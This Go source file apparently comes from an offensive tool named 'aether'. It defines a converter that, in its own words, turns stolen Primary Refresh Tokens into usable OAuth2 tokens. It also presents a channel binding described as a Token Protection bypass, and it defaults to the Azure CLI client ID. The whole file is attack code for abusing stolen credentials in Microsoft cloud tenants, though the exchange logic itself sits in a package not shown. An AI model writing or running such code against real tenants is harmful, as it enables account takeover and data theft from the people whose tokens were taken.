package token

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
	"github.com/Debajyoti0-0/aether/internal/types"
)

// PRTConverter converts stolen PRTs into usable OAuth2 tokens.
type PRTConverter struct {
	Client *msoapx.Client
	// Binding is the Token Protection channel binding presented on
	// every conversion request (Token Protection bypass).
	Binding *msoapx.ChannelBinding
}

// NewPRTConverter builds a converter around an MS-OAPX client.
func NewPRTConverter(client *msoapx.Client) *PRTConverter {
	return &PRTConverter{Client: client}
}

// LoadPRT reads a PRT from a JSON file.
func LoadPRT(path string) (*types.PRT, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read prt file: %w", err)
	}
	return ParsePRT(data)
}

// ParsePRT decodes a PRT from JSON. It accepts both snake_case keys
// and a base64-encoded session key.
func ParsePRT(data []byte) (*types.PRT, error) {
	prt := &types.PRT{}
	if err := json.Unmarshal(data, prt); err != nil {
		return nil, fmt.Errorf("parse prt json: %w", err)
	}
	if prt.Cookie == "" {
		return nil, fmt.Errorf("prt json missing 'cookie'")
	}
	if prt.SessionKey != "" {
		// Normalize to std base64.
		if _, err := base64.StdEncoding.DecodeString(prt.SessionKey); err != nil {
			if k, err2 := base64.RawURLEncoding.DecodeString(prt.SessionKey); err2 == nil {
				prt.SessionKey = base64.StdEncoding.EncodeToString(k)
			}
		}
	}
	return prt, nil
}

// validatePRT checks required structure before exchanging.
func (c *PRTConverter) validatePRT(prt *types.PRT) error {
	if prt.IsZero() {
		return fmt.Errorf("prt cookie is empty")
	}
	if prt.TenantID == "" {
		return fmt.Errorf("tenant_id is required")
	}
	if prt.SessionKey == "" {
		return fmt.Errorf("session_key is required for proof-of-possession")
	}
	if _, err := base64.StdEncoding.DecodeString(prt.SessionKey); err != nil {
		return fmt.Errorf("session_key is not valid base64: %w", err)
	}
	return nil
}

// ConvertPRTToOAuth exchanges a PRT for OAuth2 tokens for a resource.
func (c *PRTConverter) ConvertPRTToOAuth(ctx context.Context, prt *types.PRT, clientID, resource string) (*types.OAuthTokens, error) {
	if err := c.validatePRT(prt); err != nil {
		return nil, fmt.Errorf("invalid prt: %w", err)
	}
	if clientID == "" {
		clientID = DefaultClientID
	}

	return c.Client.Exchange(ctx, msoapx.ExchangeRequest{
		Tenant:   prt.TenantID,
		ClientID: clientID,
		Resource: resource,
		PRT:      prt,
		Binding:  c.Binding,
	})
}

// DefaultClientID is a first-party public client id used for exchanges
// when the operator does not supply one.
const DefaultClientID = "1950a258-227b-4e31-a9cf-717495945fc2" // Azure CLI
